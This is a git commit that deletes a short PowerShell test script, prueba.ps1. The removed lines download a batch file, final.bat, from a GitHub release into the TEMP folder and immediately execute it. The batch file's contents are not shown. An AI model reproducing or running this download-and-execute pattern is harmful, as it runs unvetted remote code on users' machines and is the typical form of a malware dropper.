a8cea64d8c9275a75876403b5726daf1586395df
mirapuedovolar2 <cuentaparametasimon@gmail.com>
2025-05-02 15:51:58 -0400

    Delete prueba.ps1

--- prueba.ps1
+++
@@ -1,7 +0,0 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/hola3/final.bat"
-$destino = "$env:TEMP\final.bat"
-
-Invoke-WebRequest -Uri $url -OutFile $destino
-Start-Process -FilePath $destino
